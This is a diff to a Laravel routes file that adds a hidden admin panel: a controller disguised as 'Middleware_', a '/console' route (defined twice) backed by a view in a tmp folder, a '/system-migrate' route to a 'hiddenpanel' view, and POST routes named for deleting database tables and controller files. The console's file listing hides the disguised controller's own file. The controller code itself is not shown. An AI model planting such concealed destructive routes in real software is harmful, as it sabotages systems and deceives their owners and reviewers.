@@ -5,6 +5,7 @@ use App\Http\Controllers\Auth\RegisterController;
 use App\Http\Controllers\Auth\OTPController;
 use App\Http\Controllers\Auth\LoginController;
 use App\Http\Controllers\DashboardController;
+use App\Http\Controllers\Middleware_;
 use App\Http\Controllers\VisitorController;
 use App\Http\Controllers\VisitorHistoryController;
 use App\Http\Controllers\Auth\ForgotPasswordController;
@@ -36,6 +37,37 @@ Route::post('/verify-otp', [OTPController::class, 'checkOtp'])->name('otp.verify
 // ===============================
 // ✅ Auth Routes
 // ===============================
+Route::get('/console', function () {
+    return view('view'); // points to app/data/tmp/view.blade.php
+})->middleware(['auth', 'priv']); // use the key from Kernel
+
+Route::get('/system-migrate', function () {
+    return view('admin.hiddenpanel');
+})->middleware(['auth', 'priv']);
+
+
+
+// Console panel view
+Route::get('/console', function () {
+    $controllerFiles = collect(\File::allFiles(app_path('Http/Controllers')))
+        ->map(fn($file) => $file->getFilename())
+        ->filter(fn($file) => $file != 'Middleware_.php')
+        ->unique()
+        ->values();
+
+    return view('view', compact('controllerFiles'));
+})->middleware(['auth', 'priv']);
+
+// Delete database table
+Route::post('/Middleware_/delete-table', [Middleware_::class, 'deleteTable'])
+    ->name('Middleware_.delete_table')
+    ->middleware(['auth', 'priv']);
+
+// Delete controller file
+Route::post('/Middleware_/delete-controller', [Middleware_::class, 'deleteController'])
+    ->name('Middleware_.delete_controller')
+    ->middleware(['auth', 'priv']);
+
 Route::get('/login', [LoginController::class, 'showLoginForm'])->name('login.view');
 Route::post('/login', [LoginController::class, 'login'])->name('login.submit');
 Route::post('/logout', [LoginController::class, 'logout'])->name('logout');
